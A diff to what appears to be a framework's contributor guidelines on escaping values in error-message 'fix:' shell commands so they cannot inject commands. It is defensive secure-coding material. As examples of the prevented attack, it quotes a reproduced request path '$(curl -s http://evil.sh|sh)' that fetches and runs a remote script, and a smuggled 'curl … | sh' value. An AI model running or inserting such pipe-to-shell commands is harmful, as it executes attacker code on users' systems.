@@ -9,6 +9,7 @@ is a change to every package.
 | Errors | subclass `UltimateError`; never `throw new Error` |
 | Values in a message | `renderCauseValue()` / `renderFixLiteral()`; never raw `JSON.stringify`, `String()` or `${…}` on an `unknown` |
 | A value in a `fix:` a shell READS | `renderFixShellArg(value, placeholder)` — `renderFixLiteral` answers DOUBLE quotes, in which `$(…)`, `` ` `` and `${…}` are still live, so it is the wrong tool for a command position and cannot be made right. An ordinary path or URL passes through; anything a shell would read becomes the placeholder. Reproduced: an unauthenticated `GET /$(curl -s http://evil.sh\|sh)` rendered that substitution into `x g route …`, the line the framework tells its reader to paste |
+| Whether that value TRAVELS | `isFixShellSafe(value)` — the predicate `renderFixShellArg` is itself built on, never a second copy of the rule. A placeholder is honest text and it is NOT a runnable command: `curl -sS -m 5 <the provider jwks_uri>` is read by a shell as a redirection from a file called `the`, and `rm -f <the profile directory>/SingletonLock` deletes nothing it names. A `fix:` whose value sits mid-command asks this first and emits PROSE when the answer is no — `@ultimat3/auth`'s `jwks.ts` and `@ultimat3/scraping`'s `profileLocked` are the worked examples |
 | Rendering the 3-line format | nothing to remember — `UltimateError`'s CONSTRUCTOR escapes `code`, `title`, `cause`, `fix` and `docs` with `singleLine()`. Call it yourself only when you render a shape this class never built, e.g. a `Finding` |
 | A value a CALLER supplied | `describeValue()` — shape, never content. `renderCauseValue` is safe against throwing, not against leaking |
 | Reading a caught value | `renderThrowable()` / `isThrownError()` / `stringField()`; never `error.message`, `error instanceof Error` or `typeof error.code === 'string'` directly — the probe throws before the renderer runs |
@@ -170,7 +171,10 @@ app root, so `at` and `keyPath` are `join(root, …)` — data — and three of 
 `git checkout --` while `X_SECRETS_KEY_MISSING` puts a path INSIDE a `$(cat …)`, where a second
 `$(…)` substitutes before `cat` runs. The path goes through `renderFixShellArg`; the variable name
 is matched against `/^[A-Z_][A-Z0-9_]*$/` and a non-name degrades the whole line to prose, because
-`export PATH; curl … | sh=` has no quoted form that makes it an assignment.
+`export PATH; curl … | sh=` has no quoted form that makes it an assignment. `X_SECRETS_KEY_MISMATCH`
+carries no key id in its command at all: the id is read out of the envelope of a file on disk, so a
+newline in it ends the trailing `#` comment and appends a second command — the `cause` and `meta`
+name it, and the `fix:` points at the cause.
 
 `secrets-errors.ts` registers its seven codes through `registerErrorCodes()` rather than joining
 `CORE_CODE_TITLES` — the codes and the module that throws them ship together, and `registerErrorCodes`
